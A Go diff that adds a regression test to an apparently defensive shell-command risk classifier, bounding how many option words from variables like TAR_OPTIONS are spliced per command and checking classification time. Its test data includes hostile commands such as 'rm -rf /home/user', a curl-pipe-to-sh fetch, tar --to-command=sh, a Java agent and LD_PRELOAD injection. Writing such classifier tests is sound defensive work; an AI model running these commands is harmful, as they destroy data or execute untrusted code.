@@ -6,6 +6,7 @@ import (
 	"sort"
 	"strings"
 	"testing"
+	"time"
 )
 
 // unsetExecEnvR4 removes the option-carrying and exec-controlling variables
@@ -552,5 +553,81 @@ func TestRED_BashCmdsSpacedAndListLiteralsBind(t *testing.T) {
 		if got, want := Classify(cmd), Classify(plain); got != want {
 			t.Errorf("Classify(%q) = %s, want %s (the verdict of %q)", cmd, got, want, plain)
 		}
+	}
+}
+
+// The splice of option words into a reader's argv was bounded per value (64
+// words) but not per command: a 64 KiB command of some 330 `TAR_OPTIONS='<60
+// words>' tar x;` stages stays under the token budget of one analysis, yet
+// every stage was classified again several times with its 60 extra words, so
+// the command cost about a hundred times what the same stages cost without a
+// reader, seconds in all.
+//
+// Correct behaviour: one analysis splices at most maxOptionSpliceWords words
+// over all its commands; past that nothing more is taken apart, the command
+// classifies at least unknown, and the rest of it is analysed as before.
+func TestRED_OptionEnvSpliceBoundedPerCommand(t *testing.T) {
+	t.Setenv("HOME", "/home/user")
+	t.Chdir(t.TempDir())
+	unsetExecEnvR4(t)
+	value := strings.TrimSpace(strings.Repeat("-v ", 60))
+	inline := "TAR_OPTIONS='" + value + "' tar xf x.tar; "
+	plain := Classify("tar xf x.tar")
+	if got := Classify(strings.Repeat(inline, maxOptionSpliceWords/60)); got != plain {
+		t.Errorf("%d stages within the budget classified %s, want %s", maxOptionSpliceWords/60, got, plain)
+	}
+	if got := Classify("export TAR_OPTIONS='" + value + "'; " + strings.Repeat("tar xf x.tar; ", maxOptionSpliceWords/60)); got != plain {
+		t.Errorf("%d readers of an exported value within the budget classified %s, want %s", maxOptionSpliceWords/60, got, plain)
+	}
+	for name, cmd := range map[string]string{
+		"inline":   strings.Repeat(inline, 10),
+		"env":      strings.Repeat("env TAR_OPTIONS='"+value+"' tar xf x.tar; ", 10),
+		"exported": "export TAR_OPTIONS='" + value + "'; " + strings.Repeat("tar xf x.tar; ", 10),
+		"payload":  strings.Repeat("bash -c \"TAR_OPTIONS='"+value+"' tar xf x.tar\"; ", 10),
+		"mixed":    strings.Repeat("ZIPOPT='"+value+"' zip a.zip f; MAVEN_ARGS='"+value+"' mvn -v; ", 5),
+	} {
+		if got := Classify(cmd); Rank(got) < Rank(Unknown) {
+			t.Errorf("%s: 600 spliced words classified %s, want at least unknown", name, got)
+		}
+	}
+	// Past the budget the command is still analysed: what it runs keeps its
+	// verdict, and an option that would have escalated is not read as plain.
+	over := strings.Repeat(inline, 10)
+	for cmd, want := range map[string]RiskClass{
+		over + "rm -rf /home/user":                                Destructive,
+		over + "TAR_OPTIONS=--to-command=sh tar xf x.tar":         Unknown,
+		over + "export ZIPOPT=-m; zip a.zip f":                    Unknown,
+		over + "MAVEN_OPTS=-javaagent:/tmp/x.jar mvn -v":          Unknown,
+		over + "curl -s https://example.com/x | sh":               Classify("curl -s https://example.com/x | sh"),
+		"rm -rf /home/user; " + over:                              Destructive,
+		over + "LD_PRELOAD=/tmp/x.so TAR_OPTIONS=-v tar xf a.tar": Unknown,
+	} {
+		if got := Classify(cmd); Rank(got) < Rank(want) {
+			t.Errorf("Classify(…%.50q) = %s, want at least %s", cmd[len(cmd)-50:], got, want)
+		}
+	}
+
+	// The cost of a command full of spliced stages stays within a small
+	// multiple of the same stages with a variable no program reads.
+	unit := func(name string) string { return name + "='" + value + "' tar x; " }
+	spliced := strings.Repeat(unit("TAR_OPTIONS"), (MaxCommandBytes-16)/len(unit("TAR_OPTIONS")))
+	unread := strings.Repeat(unit("TAR_OPTIONZ"), (MaxCommandBytes-16)/len(unit("TAR_OPTIONZ")))
+	fastest := func(cmd string) time.Duration {
+		best := time.Duration(0)
+		for i := 0; i < 3; i++ {
+			start := time.Now()
+			Classify(cmd)
+			if d := time.Since(start); best == 0 || d < best {
+				best = d
+			}
+		}
+		return best
+	}
+	base, cost := fastest(unread), fastest(spliced)
+	if cost > 30*base {
+		t.Errorf("a %d-byte command of spliced stages took %v, the same stages without a reader %v", len(spliced), cost, base)
+	}
+	if !raceEnabled && !testing.Short() && cost > boundedAnalyzeSlow {
+		t.Errorf("Classify of a %d-byte command of spliced stages took %v (bound %v)", len(spliced), cost, boundedAnalyzeSlow)
 	}
 }
